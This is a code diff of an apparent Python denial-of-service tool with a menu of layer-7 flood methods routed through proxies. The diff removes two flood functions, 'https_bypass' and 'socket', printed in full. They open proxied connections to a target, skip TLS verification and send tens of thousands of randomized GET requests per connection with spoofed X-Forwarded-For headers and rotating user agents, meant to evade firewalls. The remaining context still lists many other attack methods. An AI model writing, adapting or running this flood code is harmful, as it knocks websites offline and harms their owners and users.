@@ -375,6 +375,7 @@ def build_threads(mode, thread_num, event, proxy_type, target_ip=None, target_po
             th = threading.Thread(target=cc, args=(event, proxy_type,))
             th.daemon = True
             th.start()
+    # Added the new 'kill' method to thread building
     elif mode == "kill":
         for _ in range(thread_num):
             th = threading.Thread(target=kill, args=(event, proxy_type,))
@@ -383,16 +384,6 @@ def build_threads(mode, thread_num, event, proxy_type, target_ip=None, target_po
     elif mode == "head":
         for _ in range(thread_num):
             th = threading.Thread(target=head, args=(event, proxy_type,))
-            th.daemon = True
-            th.start()
-    elif mode == "socket":
-        for _ in range(thread_num):
-            th = threading.Thread(target=socket, args=(event, proxy_type,))
-            th.daemon = True
-            th.start()
-    elif mode == "https-bypass":  # Новый метод
-        for _ in range(thread_num):
-            th = threading.Thread(target=https_bypass, args=(event, proxy_type,))
             th.daemon = True
             th.start()
     elif mode == "udpflood":
@@ -613,139 +604,6 @@ def setup_socket(proxy_type, proxy):
     s.settimeout(5)
     return s
 
-def https_bypass(event, proxy_type):
-    global proxies, target, path, port, protocol
-    # Мега-огромный пул заголовков для тотального хаоса
-    headers_pool = [GenReqHeader("get") for _ in range(5000)]  # 5000 заголовков, пиздец!
-    user_agents = [
-        "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36",
-        "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/14.0 Safari/605.1.15",
-        "Mozilla/5.0 (iPhone; CPU iPhone OS 14_6 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/14.0 Mobile/15E148 Safari/604.1",
-        "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:89.0) Gecko/20100101 Firefox/89.0",
-        "Mozilla/5.0 (Linux; Android 10; SM-G975F) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.114 Mobile Safari/537.36",
-        "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:88.0) Gecko/20100101 Firefox/88.0",
-        "Mozilla/5.0 (iPad; CPU OS 14_5 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) CriOS/91.0.4472.80 Mobile/15E148 Safari/604.1",
-        "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_14_6) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.4430.212 Safari/537.36",
-        "Mozilla/5.0 (Windows NT 6.1; WOW64; Trident/7.0; rv:11.0) like Gecko",
-        "Mozilla/5.0 (Linux; Android 11; Pixel 4 XL) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.4430.210 Mobile Safari/537.36",
-        "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Edge/91.0.864.48",
-        "Mozilla/5.0 (Macintosh; Intel Mac OS X 11_4) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.77 Safari/537.36",
-        "Mozilla/5.0 (iPhone; CPU iPhone OS 13_5 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) FxiOS/27.0 Mobile/15E148 Safari/605.1.15",
-        "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.4430.93 Safari/537.36",
-        "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/89.0.4389.128 Safari/537.36",
-        "Mozilla/5.0 (Android 10; Mobile; rv:88.0) Gecko/88.0 Firefox/88.0",
-        "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_6) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/13.1.2 Safari/605.1.15",
-        "Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.77 Safari/537.36",
-        "Mozilla/5.0 (Linux; Android 9; SM-G960F) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/89.0.4389.105 Mobile Safari/537.36",
-        "Mozilla/5.0 (iPad; CPU OS 13_7 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/13.1.2 Mobile/15E148 Safari/604.1",
-        "Mozilla/5.0 (Windows NT 6.3; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.4430.212 Safari/537.36",
-        "Mozilla/5.0 (X11; Fedora; Linux x86_64; rv:89.0) Gecko/20100101 Firefox/89.0",
-        "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_6) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/14.0.3 Safari/605.1.15",
-        "Mozilla/5.0 (Linux; Android 11; SM-A715F) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.88 Mobile Safari/537.36",
-        "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.4430.85 Safari/537.36",
-        "Mozilla/5.0 (iPhone; CPU iPhone OS 14_4_2 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/14.0.3 Mobile/15E148 Safari/604.1",
-        "Mozilla/5.0 (X11; Linux x86_64; rv:78.0) Gecko/20100101 Firefox/78.0",
-        "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_14_5) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/89.0.4389.90 Safari/537.36",
-        "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Edge/90.0.818.62",
-        "Mozilla/5.0 (Linux; Android 10; Mi 9T Pro) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.4430.210 Mobile Safari/537.36",
-        "Mozilla/5.0 (iPad; CPU OS 14_6 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) CriOS/90.0.4430.212 Mobile/15E148 Safari/604.1",
-        "Mozilla/5.0 (Windows NT 6.1; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.77 Safari/537.36",
-        "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:87.0) Gecko/20100101 Firefox/87.0",
-        "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.4430.93 Safari/537.36",
-        "Mozilla/5.0 (Linux; Android 11; Pixel 5) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.77 Mobile Safari/537.36",
-        "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:90.0) Gecko/20100101 Firefox/90.0",
-        "Mozilla/5.0 (iPhone; CPU iPhone OS 13_6 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/13.1.2 Mobile/15E148 Safari/604.1",
-        "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_14_6) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/13.0.5 Safari/605.1.15",
-        "Mozilla/5.0 (Linux; Android 10; SM-N975F) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.4430.210 Mobile Safari/537.36",
-        "Mozilla/5.0 (Windows NT 10.0; WOW64; rv:78.0) Gecko/20100101 Firefox/78.0",
-        "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.77 Safari/537.36",
-        "Mozilla/5.0 (iPad; CPU OS 13_5 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/13.1.1 Mobile/15E148 Safari/604.1",
-        "Mozilla/5.0 (Windows NT 6.3; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/89.0.4389.114 Safari/537.36",
-        "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_5) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/13.1.1 Safari/605.1.15",
-        "Mozilla/5.0 (Linux; Android 9; SM-G950F) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.4430.212 Mobile Safari/537.36",
-        "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.101 Safari/537.36",
-        "Mozilla/5.0 (X11; Linux x86_64; rv:89.0) Gecko/20100101 Firefox/89.0",
-        "Mozilla/5.0 (iPhone; CPU iPhone OS 14_5 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/14.1 Mobile/15E148 Safari/604.1",
-        "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.101 Safari/537.36",
-        "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Edge/91.0.864.59"
-    ]
-    add = "?" if "?" not in path else "&"
-    event.wait()
-    while True:
-        s = None
-        try:
-            proxy = Choice(proxies)
-            s = setup_socket(proxy_type, proxy)
-            s.settimeout(0.3)  # Ультра-быстрый таймаут
-            s.connect((str(target), int(port)))
-            if protocol == "https":
-                ctx = ssl.SSLContext(ssl.PROTOCOL_TLS_CLIENT)
-                ctx.check_hostname = False
-                ctx.verify_mode = ssl.CERT_NONE
-                s = ctx.wrap_socket(s, server_hostname=target)
-            
-            # Пиздец сколько запросов
-            requests_to_send_per_connection = 75000
-            for _ in range(requests_to_send_per_connection):
-                header = Choice(headers_pool)
-                # Спуфинг IP и ротация User-Agent
-                spoof_ip = f"{random.randint(1, 255)}.{random.randint(0, 255)}.{random.randint(0, 255)}.{random.randint(0, 255)}"
-                header += f"X-Forwarded-For: {spoof_ip}\r\n"
-                header += f"User-Agent: {Choice(user_agents)}\r\n"
-                # Дополнительные заголовки для обхода WAF и имитации браузера
-                header += "Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8\r\n"
-                header += "Accept-Language: en-US,en;q=0.5\r\n"
-                header += "Accept-Encoding: gzip, deflate, br\r\n"
-                header += "Connection: keep-alive\r\n"
-                header += f"Cache-Control: max-age={random.randint(0, 3600)}\r\n"
-                header += f"Referer: https://{target}/{randomurl()}\r\n"
-                get_host = "GET " + path + add + randomurl() + " HTTP/1.1\r\nHost: " + target + "\r\n"
-                request = get_host + header
-                sent = s.send(str.encode(request))
-                if not sent:
-                    break
-                # Ультра-минимальная задержка
-                time.sleep(0.0005)
-            s.close()
-        except:
-            if s:
-                s.close()
-
-def socket(event, proxy_type):
-    global proxies, target, path, port, protocol
-    # Пул заголовков для максимальной рандомизации и хаоса
-    headers_pool = [GenReqHeader("get") for _ in range(500)]  # Огромный пул для разнообразия
-    add = "?" if "?" not in path else "&"
-    event.wait()
-    while True:
-        s = None
-        try:
-            proxy = Choice(proxies)
-            s = setup_socket(proxy_type, proxy)
-            s.settimeout(0.5)  # Минимальный таймаут для бешеной скорости
-            s.connect((str(target), int(port)))
-            if protocol == "https":
-                ctx = ssl.SSLContext(ssl.PROTOCOL_TLS_CLIENT)
-                ctx.check_hostname = False
-                ctx.verify_mode = ssl.CERT_NONE
-                s = ctx.wrap_socket(s, server_hostname=target)
-            
-            # Максимум запросов за соединение — просто пиздец
-            requests_to_send_per_connection = 50000  # Ещё больше, чем в kill
-            for _ in range(requests_to_send_per_connection):
-                header = Choice(headers_pool)
-                get_host = "GET " + path + add + randomurl() + " HTTP/1.1\r\nHost: " + target + "\r\n"
-                request = get_host + header
-                sent = s.send(str.encode(request))
-                if not sent:
-                    break
-                # Минимальная задержка для максимальной нагрузки
-                time.sleep(0.001)
-            s.close()
-        except:
-            if s:
-                s.close()
-                
 def cc(event, proxy_type):
     global proxies
     header = GenReqHeader("get")
@@ -1584,9 +1442,9 @@ def main():
 {cyan_to_blue("‖")} {cyan_to_pink("░")} {cyan_to_blue("‖")} {cyan_to_pink("⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿")} {cyan_to_pink("  ‖ ░")} {cyan_to_blue("‖")} {gold_to_white("[●]")} {cyan_to_pink(".l7 post...... ")}{cyan_to_pink("<link> <threads> <time> <port>")}      {cyan_to_blue("‖")} {gray("PERMISSION:")} {green_to_white("[DEFAULT]")} {cyan_to_blue("‖")}
 {cyan_to_blue("‖")} {cyan_to_pink("░")} {cyan_to_blue("‖")} {cyan_to_pink("⣿⣿⣿⣿⣿⣿⠿⠿⠻⣿⣿⣿⣿⣿⣿⣿⣿⣿")} {cyan_to_pink("  ‖ ░")} {cyan_to_blue("‖")} {gold_to_white("[●]")} {cyan_to_pink(".l7 head...... ")}{cyan_to_pink("<link> <threads> <time> <port>")}      {cyan_to_blue("‖")} {gray("PERMISSION:")} {green_to_white("[DEFAULT]")} {cyan_to_blue("‖")}
 {cyan_to_blue("‖")} {cyan_to_pink("░")} {cyan_to_blue("‖")} {cyan_to_pink("⣿⣿⣿⣿⣿⣿⠏⠀⢐⣿⣿⣿⣿⣿⣿⣿⣿⣿")} {cyan_to_pink("  ‖ ░")} {cyan_to_blue("‖")} {gold_to_white("[●]")} {cyan_to_pink(".l7 browser... ")}{cyan_to_pink("<link> <threads> <time> <port>")}      {cyan_to_blue("‖")} {gray("PERMISSION:")} {green_to_white("[DEFAULT]")} {cyan_to_blue("‖")}
-{cyan_to_blue("‖")} {cyan_to_pink("░")} {cyan_to_blue("‖")} {cyan_to_pink("⣿⣿⣿⣿⣿⣿⡿⠀⠀⣾⣿⣿⣿⣿⣿⣿⣿⣿")} {cyan_to_pink("  ‖ ░")} {cyan_to_blue("‖")} {gold_to_white("[●]")} {cyan_to_pink(".l7 socket.... ")}{cyan_to_pink("<link> <threads> <time> <port>")}      {cyan_to_blue("‖")} {gray("PERMISSION:")} {green_to_white("[DEFAULT]")} {cyan_to_blue("‖")}
+{cyan_to_blue("‖")} {cyan_to_pink("░")} {cyan_to_blue("‖")} {cyan_to_pink("⣿⣿⣿⣿⣿⣿⡿⠀⠀⣾⣿⣿⣿⣿⣿⣿⣿⣿")} {cyan_to_pink("  ‖ ░")} {cyan_to_blue("‖")} {gold_to_white("[●]")} {cyan_to_pink(".l7 home...... ")}{cyan_to_pink("<link> <threads> <time> <port>")}      {cyan_to_blue("‖")} {gray("PERMISSION:")} {green_to_white("[DEFAULT]")} {cyan_to_blue("‖")}
 {cyan_to_blue("‖")} {cyan_to_pink("░")} {cyan_to_blue("‖")} {cyan_to_pink("⣿⣿⣿⣿⣿⣿⣇⠀⢰⣿⡌⠀⢹⣿⣿⣿⣿⣿")} {cyan_to_pink("  ‖ ░")} {cyan_to_blue("‖")} {gold_to_white("[●]")} {cyan_to_pink(".l7 tls....... ")}{cyan_to_pink("<link> <threads> <time> <port>")}      {cyan_to_blue("‖")} {gray("PERMISSION:")} {green_to_white("[DEFAULT]")} {cyan_to_blue("‖")}
-{cyan_to_blue("‖")} {cyan_to_pink("░")} {cyan_to_blue("‖")} {cyan_to_pink("⣿⣿⣿⣿⣿⣿⣿⣶⣶⣶⣶⣶⣾⣿⣿⣿⣿⣿")} {cyan_to_pink("  ‖ ░")} {cyan_to_blue("‖")} {gold_to_white("[●]")} {cyan_to_pink(".l7 https-bypass")}{cyan_to_pink("<link> <threads> <time> <port>")}     {cyan_to_blue("‖")} {gray("PERMISSION:")} {green_to_white("[DEFAULT]")} {cyan_to_blue("‖")}
+{cyan_to_blue("‖")} {cyan_to_pink("░")} {cyan_to_blue("‖")} {cyan_to_pink("⣿⣿⣿⣿⣿⣿⣿⣶⣶⣶⣶⣶⣾⣿⣿⣿⣿⣿")} {cyan_to_pink("  ‖ ░")} {cyan_to_blue("‖")} {gold_to_white("[●]")} {cyan_to_pink(".l7 ovh....... ")}{cyan_to_pink("<link> <threads> <time> <port>")}      {cyan_to_blue("‖")} {gray("PERMISSION:")} {green_to_white("[DEFAULT]")} {cyan_to_blue("‖")}
 {cyan_to_blue("‖")} {cyan_to_pink("░")} {cyan_to_blue("‖")} {cyan_to_pink("⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿")} {cyan_to_pink("  ‖ ░")} {cyan_to_blue("‖")} {gold_to_white("[●]")} {cyan_to_pink(".l7 http-storm ")}{cyan_to_pink("<link> <threads> <time> <port>")}      {cyan_to_blue("‖")} {gray("PERMISSION:")} {green_to_white("[DEFAULT]")} {cyan_to_blue("‖")}
 {cyan_to_blue("‖")} {cyan_to_pink("░")} {cyan_to_blue("‖")} {cyan_to_pink("⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿")} {cyan_to_pink("  ‖ ░")} {cyan_to_blue("‖")} {gold_to_white("[●]")} {cyan_to_pink(".l7 api-killer ")}{cyan_to_pink("<link> <threads> <time> <port>")}      {cyan_to_blue("‖")} {gray("PERMISSION:")} {green_to_white("[DEFAULT]")} {cyan_to_blue("‖")}
 {cyan_to_blue("‖")} {cyan_to_pink("░")} {cyan_to_blue("╠══════════════════════╣")} {cyan_to_pink("░")} {cyan_to_blue("╠════════════════════════════════════════════════════════╬═══════════════════════╣")}
@@ -1644,7 +1502,7 @@ def main():
                 port = int(args[5]) if len(args) > 5 else None
                 proxy_type = 5  # Default to SOCKS5
                 # Added 'kill' to the list of valid L7 methods
-                if method not in ["cc", "kill", "post", "head", "uambypass", "browser", "home", "cfbypass", "tls", "ovh", "dgb", "http-storm", "api-killer", "socket", "https-bypass"]:
+                if method not in ["cc", "kill", "post", "head", "uambypass", "browser", "home", "cfbypass", "tls", "ovh", "dgb", "http-storm", "api-killer"]:
                     print(Colorate.Horizontal(Colors.cyan_to_blue, "> Invalid L7 method. Use 'methods' to list available options."))
                     continue
                 if threads < 1 or duration < 1:
